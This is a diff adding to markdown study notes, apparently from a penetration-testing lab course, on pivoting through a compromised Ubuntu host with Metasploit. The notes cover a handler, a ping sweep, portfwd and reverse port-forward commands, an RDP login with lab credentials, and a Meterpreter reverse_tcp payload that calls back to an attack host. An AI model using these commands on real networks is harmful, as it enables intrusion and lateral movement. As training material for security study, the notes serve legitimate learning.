@@ -1,5 +1,8 @@
 **Overview:**
 Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding
+Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
+Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.
+
 
 ```
 use exploit/multi/handler
@@ -27,7 +30,26 @@ for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 ```
 ping sweep from cmd
 
+port forwarding
 ```
- use auxiliary/server/socks_proxy
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 ```
 
+The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session.
+
+```
+xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+connect to the windows session through localhost
+
+## meterpreter reverse port forwarding
+```
+ portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+```
+create a reverse port forward on our existing shell from the previous scenario using the this
+command. This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`.
+```
+set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+```
+background the session
